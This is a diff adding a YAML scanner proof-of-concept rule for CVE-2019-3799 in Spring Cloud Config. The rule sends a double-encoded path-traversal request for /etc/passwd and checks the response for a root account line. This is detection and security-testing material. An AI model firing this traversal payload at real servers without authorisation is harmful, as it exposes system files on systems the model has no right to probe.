@@ -1,0 +1,17 @@
+detail:
+  author: Loneyer
+  links:
+  - https://github.com/Loneyers/vuldocker/tree/master/spring/CVE-2019-3799
+  version: <2.1.2, 2.0.4, 1.4.6
+expression: r0()
+manual: true
+name: poc-yaml-springcloud-cve-2019-3799
+rules:
+  r0:
+    expression: response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+    request:
+      cache: true
+      follow_redirects: true
+      method: GET
+      path: /test/pathtraversal/master/..%252F..%252F..%252F..%252F..%252F..%252Fetc%252fpasswd
+transport: http
